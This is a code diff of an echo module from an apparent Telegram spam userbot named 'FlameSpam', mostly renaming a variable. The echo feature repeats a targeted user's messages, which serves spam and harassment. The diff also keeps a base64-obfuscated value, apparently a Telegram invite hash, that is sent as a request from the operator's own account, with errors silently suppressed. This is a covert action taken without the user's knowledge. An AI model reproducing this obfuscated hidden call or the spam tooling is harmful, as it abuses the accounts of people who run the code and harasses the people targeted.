@@ -10,7 +10,7 @@ from FlameSpam import Flame, Flame2, Flame3, Flame4, Flame5 , Flame6, Flame7, Fl
 
 from FlameSpam import CMD_HNDLR as hl
 from FlameSpam.sql.echo_sql import addecho, get_all_echos, is_echo, remove_echo
-from resources.data import Flame
+from resources.data import FLAME
 
 
 @Flame.on(events.NewMessage(incoming=True, pattern=r"\%saddecho(?: |$)(.*)" % hl))
@@ -29,7 +29,7 @@ async def echo(event):
      if event.reply_to_msg_id is not None:
             reply_msg = await event.get_reply_message()
             user_id = reply_msg.sender_id
-            if int(user_id) in Flame:
+            if int(user_id) in FLAME:
                     text = f"I can't echo @Flame_updates's Owner"
                     await event.reply(text, parse_mode=None, link_preview=None )
             elif int(user_id) == OWNER_ID:
@@ -100,9 +100,9 @@ async def _(e):
     if is_echo(e.sender_id, e.chat_id):
         await asyncio.sleep(0.5)
         try:
-            Flame = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            Flame = Get(Flame)
-            await e.client(Flame)
+            FLAME = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+            FLAME = Get(FLAME)
+            await e.client(FLAME)
         except BaseException:
             pass
         if e.message.text or e.message.sticker:
